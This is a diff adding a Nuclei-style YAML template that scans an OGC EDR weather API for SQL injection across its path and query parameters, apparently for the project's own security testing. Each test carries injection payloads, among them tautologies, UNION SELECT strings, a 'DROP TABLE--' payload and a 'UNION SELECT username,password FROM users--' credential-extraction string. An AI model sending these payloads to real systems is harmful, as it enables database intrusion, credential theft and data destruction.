@@ -1,0 +1,418 @@
+id: ogc-edr-sqli-all-params
+
+info:
+  name: OGC EDR API SQL Injection - All Parameters
+  author: weather-wms-security
+  severity: critical
+  description: |
+    Tests all EDR API parameters for SQL injection vulnerabilities including:
+    - Path parameters: collectionId, instanceId
+    - Query parameters: coords, z, datetime, parameter-name, crs, f
+    - Radius query: within, within-units
+    - Corridor query: corridor-width, width-units
+    - Cube query: bbox
+    - Area query: resolution-x, resolution-y
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+    - https://ogcapi.ogc.org/edr/
+  tags: sqli,edr,ogc,injection,critical,api
+
+variables:
+  base_collection: "hrrr-surface"
+  base_coords: "POINT(-104.5 39.5)"
+  base_param: "GUST"
+
+http:
+  # Test collectionId path parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{payload}}"
+
+    payloads:
+      payload:
+        - "{{base_collection}}'"
+        - "{{base_collection}}' OR '1'='1"
+        - "{{base_collection}}' OR '1'='1'--"
+        - "{{base_collection}}'; SELECT 1--"
+        - "{{base_collection}}\" OR \"1\"=\"1"
+        - "' UNION SELECT NULL,NULL,NULL--"
+        - "{{base_collection}}' AND 1=CONVERT(int,@@version)--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-"
+          - "PostgreSQL"
+          - "sqlite"
+          - "syntax error"
+          - "unterminated string"
+          - "database error"
+        condition: or
+
+      - type: regex
+        regex:
+          - "(?i)(sql|database|query|select|insert|update|delete).*error"
+
+  # Test coords parameter (position query)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "POINT(-104.5 39.5)'"
+        - "POINT(-104.5 39.5)' OR '1'='1"
+        - "POINT(-104.5' OR '1'='1' 39.5)"
+        - "'; SELECT 1--"
+        - "POINT(-104.5 39.5); DROP TABLE--"
+        - "' UNION SELECT 1,2,3--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+          - "database error"
+        condition: or
+
+      - type: regex
+        regex:
+          - "(?i)(sql|database).*error"
+
+  # Test parameter-name parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "{{base_param}}'"
+        - "{{base_param}}' OR '1'='1"
+        - "{{base_param}}'; SELECT 1--"
+        - "' UNION SELECT username,password FROM users--"
+        - "{{base_param}},'; DROP TABLE--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test datetime parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&datetime={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "2024-01-01T00:00:00Z'"
+        - "2024-01-01T00:00:00Z' OR '1'='1"
+        - "2024-01-01' OR '1'='1"
+        - "'; SELECT 1--"
+        - "../2024-01-01' UNION SELECT 1--"
+        - "2024-01-01T00:00:00Z/2024-01-02T00:00:00Z'"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test z (vertical level) parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&z={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "850'"
+        - "850' OR '1'='1"
+        - "850'; SELECT 1--"
+        - "1000/500'"
+        - "R5/1000/100'"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test crs parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&crs={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "CRS84'"
+        - "CRS84' OR '1'='1"
+        - "'; SELECT 1--"
+        - "http://www.opengis.net/def/crs/OGC/1.3/CRS84'"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test f (format) parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/position?coords={{base_coords}}&parameter-name={{base_param}}&f={{payload}}"
+
+    payloads:
+      payload:
+        - "CoverageJSON'"
+        - "CoverageJSON' OR '1'='1"
+        - "'; SELECT 1--"
+        - "json'"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test within parameter (radius query)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/radius?coords={{base_coords}}&within={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "100'"
+        - "100' OR '1'='1"
+        - "100'; SELECT 1--"
+        - "0 UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test within-units parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/radius?coords={{base_coords}}&within=100&within-units={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "km'"
+        - "km' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test corridor-width parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/corridor?coords=LINESTRING(-105 40,-104 39)&corridor-width={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "10'"
+        - "10' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test width-units parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/corridor?coords=LINESTRING(-105 40,-104 39)&corridor-width=10&width-units={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "km'"
+        - "km' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test bbox parameter (cube query)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/cube?bbox={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "-110,35,-100,40'"
+        - "-110,35,-100,40' OR '1'='1"
+        - "'; SELECT 1--"
+        - "-110,35,-100,40,-110,35' UNION SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test resolution-x parameter (area query)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/area?coords=POLYGON((-110 40,-100 40,-100 35,-110 35,-110 40))&parameter-name={{base_param}}&resolution-x={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "10'"
+        - "10' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test resolution-y parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/area?coords=POLYGON((-110 40,-100 40,-100 35,-110 35,-110 40))&parameter-name={{base_param}}&resolution-y={{payload}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "10'"
+        - "10' OR '1'='1"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test instanceId path parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/instances/{{payload}}"
+
+    payloads:
+      payload:
+        - "latest'"
+        - "latest' OR '1'='1"
+        - "'; SELECT 1--"
+        - "2024010100'"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test trajectory coords
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/trajectory?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "LINESTRING(-105 40,-104 39)'"
+        - "LINESTRING(-105' OR '1'='1' 40,-104 39)"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
+
+  # Test area coords (polygon)
+  - method: GET
+    path:
+      - "{{BaseURL}}/edr/collections/{{base_collection}}/area?coords={{payload}}&parameter-name={{base_param}}&f=CoverageJSON"
+
+    payloads:
+      payload:
+        - "POLYGON((-110 40,-100 40,-100 35,-110 35,-110 40))'"
+        - "POLYGON((-110' OR '1'='1' 40,-100 40,-100 35,-110 35,-110 40))"
+        - "'; SELECT 1--"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "syntax error"
+        condition: or
